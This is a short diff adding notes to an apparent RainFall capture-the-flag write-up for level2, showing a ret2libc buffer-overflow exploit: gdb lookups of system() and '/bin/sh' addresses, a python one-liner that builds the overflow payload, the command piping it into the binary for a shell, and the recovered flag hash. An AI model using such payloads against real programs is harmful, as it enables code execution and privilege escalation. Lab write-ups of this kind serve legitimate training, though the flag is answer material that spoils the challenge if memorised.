@@ -161,6 +161,24 @@ first apperance of 'a' =
  
  
  
+ =====
  
+ ret2libc
+ 
+ 
+ ret of p() func  0x0804853e to bypass check
+ 
+ (gdb) p system ==> 0xb7e6b060
+ 
+ (gdb) find system, +9999999, "/bin/sh" ==> 0xb7f8cc58
+ 
+ system() needs a return value
+ 
+ level2@RainFall:~$ python -c 'print "A" * 80 + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "AAAA" + "\xb7\xf8\xcc\x58"[::-1] ' > /tmp/payload
+ 
+ 
+ (cat /tmp/payload ; cat) | ./level2
+ 
+ 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
  
 
